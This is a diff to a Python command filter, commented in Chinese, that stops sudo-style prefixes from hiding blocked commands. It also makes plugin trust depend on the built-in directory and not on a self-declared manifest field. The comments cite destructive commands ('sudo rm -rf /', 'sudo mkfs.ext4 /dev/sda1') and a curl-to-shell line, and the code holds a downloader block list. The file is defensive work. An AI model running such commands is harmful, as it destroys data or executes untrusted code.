@@ -86,6 +86,21 @@ DOWNLOADERS = ('curl', 'wget')
 # 命令分隔符 —— 用于切出"命令位置"
 _SEPS = ('|', ';', '&&', '||', '\n')
 
+# ★ 提权/包装命令 —— 这些后面跟的才是真正要执行的命令
+#
+#   这是个真实漏洞：早期版本只取每段的第一个 token 去比对
+#   BLOCKED_COMMANDS，于是 `sudo shutdown -h now` 的第一个 token 是
+#   'sudo'，不在黑名单里 → 放行。`sudo mkfs.ext4 /dev/sda1`、
+#   `sudo parted /dev/sda`、`pkexec shutdown` 全都能过。
+#
+#   修法：把它们当成"透明前缀"穿透过去，检查它们后面那个命令。
+#   注意 BLOCKED_PATTERNS 是子串匹配，所以 `sudo rm -rf /` 本来就被拦 ——
+#   漏的只是 BLOCKED_COMMANDS 这一路（shutdown/reboot/mkfs/fdisk/parted/dd）。
+PRIV_PREFIX = (
+    'sudo', 'su', 'pkexec', 'doas', 'env', 'nice', 'nohup',
+    'timeout', 'setsid', 'stdbuf', 'xargs',
+)
+
 
 def _command_positions(cmd):
     """切出每个命令的起始 token（小写）"""
@@ -106,17 +121,32 @@ def _command_positions(cmd):
             idx = k + len(sep)
     out = []
     for st in sorted(set(starts)):
-        tok = low[st:].split()[0] if low[st:].split() else ''
-        # 去掉前导的环境变量赋值（如 FOO=bar cmd）
-        while tok and '=' in tok and not tok.startswith('-'):
-            rest = low[st:].split()
-            if len(rest) > 1:
-                tok = rest[1]
-            else:
-                tok = ''
-                break
-        if tok:
-            out.append(tok)
+        toks = low[st:].split()
+        if not toks:
+            continue
+        j = 0
+        # 跳过前导环境变量赋值（FOO=bar cmd）
+        while j < len(toks) and '=' in toks[j] and not toks[j].startswith('-'):
+            j += 1
+        # ★ 穿透提权前缀，并检查被包装的那个命令本身
+        #   同时把前缀自身也记为命令位置（万一以后把 sudo 加进黑名单）
+        while j < len(toks) and toks[j] in PRIV_PREFIX:
+            if j > 0 or True:
+                pass
+            j += 1
+            # sudo -S / sudo -n / sudo -u root 这类参数要吃掉，
+            # 否则 -u 后面的 'root' 会被当成命令名
+            while j < len(toks) and toks[j].startswith('-'):
+                j += 1
+                # -u root / -g wheel 这种"带值参数"要再吃一个
+                # ★ 注意 '-c' 不能算带值参数：sudo 没有 -c；
+                #   而 su -c shutdown 里 -c 后面直接就是命令，
+                #   若当带值吃掉，shutdown 就被跳过了。
+                if j < len(toks) and toks[j - 1] in ('-u', '-g', '-C',
+                                                     '-U', '-l'):
+                    j += 1
+        if j < len(toks):
+            out.append(toks[j])
     return out
 
 
@@ -318,8 +348,14 @@ def _is_download_pipe(cmd):
         j = 0
         while j < len(toks) and '=' in toks[j] and not toks[j].startswith('-'):
             j += 1
-        if j < len(toks) and toks[j] in DOWNLOADERS:
-            return 'download-pipe(%s)' % toks[j]
+        # ★ 同样要穿透 sudo 等前缀，否则 `sudo curl http://x | sh` 会漏
+        k = j
+        while k < len(toks) and toks[k] in PRIV_PREFIX:
+            k += 1
+            while k < len(toks) and toks[k].startswith('-'):
+                k += 1
+        if k < len(toks) and toks[k] in DOWNLOADERS:
+            return 'download-pipe(%s)' % toks[k]
     return None
 
 
@@ -347,10 +383,12 @@ _is_blocked = is_blocked
 
 
 class Plugin:
-    def __init__(self, plugin_id, manifest, entry_path):
+    def __init__(self, plugin_id, manifest, entry_path, builtin=False):
         self.id = plugin_id
         self.manifest = manifest or {}
         self.entry = entry_path
+        # ★ 是否来自程序内置目录 —— 这是"官方"的唯一可信依据
+        self.builtin = bool(builtin)
 
     @property
     def name(self):
@@ -369,7 +407,18 @@ class Plugin:
         return self.manifest.get('repo', '')
 
     def is_official(self):
-        return is_official(self.repo)
+        """是否可信到"免弹窗自动授信"
+
+        ★★ 判据是【是否在内置目录】，不是 manifest 里写的 repo 字段。
+
+          早期版本只看 self.repo（manifest 自报的字符串）——
+          那等于任何人都能在 plugin.json 里写
+              "repo": "Cool-zimo/gdpy"
+          就骗到自动全量授信，还不用弹一次窗。自动授信形同虚设。
+
+          repo 字段只能用于"展示来源"，不能用于"决定是否授信"。
+        """
+        return self.builtin
 
     def run(self, ctx):
         """
@@ -398,7 +447,11 @@ class PluginManager:
     def discover(self):
         """扫描内置 + 用户插件目录"""
         found = {}
-        for base in (plugin_dir(), user_plugin_dir()):
+        # ★ 顺序有意为之：先内置，后用户目录。
+        #   用户目录里的同名插件会覆盖内置 —— 但它是 builtin=False，
+        #   仍然要弹窗，覆盖不等于自动授信。
+        for base, is_builtin in ((plugin_dir(), True),
+                                 (user_plugin_dir(), False)):
             if not os.path.isdir(base):
                 continue
             for name in sorted(os.listdir(base)):
@@ -418,7 +471,7 @@ class PluginManager:
                 if not os.path.isfile(epath):
                     continue
                 pid = manifest.get('id') or name
-                found[pid] = Plugin(pid, manifest, epath)
+                found[pid] = Plugin(pid, manifest, epath, builtin=is_builtin)
         self._plugins = found
         return found
 
